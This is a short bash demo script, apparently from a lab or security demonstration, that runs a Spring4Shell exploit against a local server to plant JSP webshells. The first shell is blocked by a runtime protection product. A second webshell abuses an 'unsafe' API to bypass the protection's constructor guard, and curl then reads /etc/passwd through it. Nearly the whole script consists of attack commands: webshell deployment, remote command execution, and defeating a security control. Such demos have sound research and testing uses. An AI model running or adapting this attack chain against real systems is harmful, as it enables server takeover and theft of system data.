#!/bin/bash

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'  # No Color

echo -e "${RED}----Bypassing RASP using Unsafe API Abuse [Spring4Shell] 😈-----------${NC}"

echo -e "${GREEN}Deploying Webshell...${NC}"
python3 exploit.py --url="http://localhost:8080/exploit/greeting" --dir="webapps/ROOT" --file="reflection"
echo -e "\n"

sleep 8
res=$(curl "http://localhost:8080/reflection.jsp?cmd=cat%20/etc/passwd")
echo -e "\n${res}\n"
echo -e "${RED} 🧿 RASP blocked us from reading /etc/passwd file 😠"
sleep 5

echo -e "${GREEN} Now deploy another webshell that uses unsafe API and bypass constructor guard...${NC}"
python3 exploit.py --url="http://localhost:8080/exploit/greeting" --dir="webapps/ROOT" --file="unsafe"
sleep 8
echo -e "\n"


echo -e "${GREEN}Now let's use the other exploit using unsafe API ...${NC}"
res=$(curl "http://localhost:8080/unsafe.jsp?cmd=cat%20/etc/passwd")
echo -e "${res} \n"
